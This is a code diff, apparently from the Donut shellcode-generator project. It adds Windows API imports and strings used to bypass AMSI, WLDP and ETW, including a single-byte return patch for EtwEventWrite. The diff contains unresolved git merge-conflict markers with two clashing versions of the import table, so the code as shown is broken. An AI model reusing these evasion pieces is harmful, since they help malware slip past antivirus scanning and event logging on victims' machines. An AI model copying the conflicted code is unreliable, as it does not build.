@@ -65,6 +65,11 @@ static API_IMPORT api_imports[] = {
   {KERNEL32_DLL, "GetProcessHeap"},
   {KERNEL32_DLL, "HeapFree"},
   {KERNEL32_DLL, "GetLastError"},
+<<<<<<< HEAD
+=======
+  {KERNEL32_DLL, "CloseHandle"},
+  {KERNEL32_DLL, "GetSystemInfo"},
+>>>>>>> c16aad1a1add85b861d4fa9dbb736ceb904c5ad3
         
   {SHELL32_DLL,  "CommandLineToArgvW"},
   
@@ -109,10 +114,21 @@ static API_IMPORT api_imports[] = {
   {NTDLL_DLL,    "NtCreateSection"},
   {NTDLL_DLL,    "NtMapViewOfSection"},
   {NTDLL_DLL,    "NtUnmapViewOfSection"},
+<<<<<<< HEAD
   {NTDLL_DLL,    "RtlFreeUnicodeString"},
   {NTDLL_DLL,    "RtlFreeString"},
   {KERNEL32_DLL, "AddVectoredExceptionHandler"},
   {KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
+=======
+  {KERNEL32_DLL, "ReadProcessMemory"},  
+  {KERNEL32_DLL, "WideCharToMultiByte"},
+  {KERNEL32_DLL, "FlushInstructionCache"},
+  //{KERNEL32_DLL, "AddVectoredExceptionHandler"},
+  //{KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
+  //{NTDLL_DLL,    "RtlFreeUnicodeString"},
+  //{NTDLL_DLL,    "RtlFreeString"},
+  
+>>>>>>> c16aad1a1add85b861d4fa9dbb736ceb904c5ad3
   { NULL, NULL }   // last one always contains two NULL pointers
 };
 
@@ -964,6 +980,7 @@ static int build_instance(PDONUT_CONFIG c) {
       strcpy(inst->amsiInit,    "AmsiInitialize");
       strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
       strcpy(inst->amsiScanStr, "AmsiScanString");
+      strcpy(inst->amsiOpenSess,  "AmsiOpenSession");
       
       DPRINT("Copying strings required to bypass WLDP");
       
@@ -973,6 +990,7 @@ static int build_instance(PDONUT_CONFIG c) {
 
       DPRINT("Copying strings required to bypass ETW");
       strcpy(inst->ntdll, "ntdll");
+      strcpy(inst->ntTraceEvent, "NtTraceEvent");
       strcpy(inst->etwEventWrite, "EtwEventWrite");
       strcpy(inst->etwEventUnregister, "EtwEventUnregister");
       strcpy(inst->etwRet64, "\xc3");
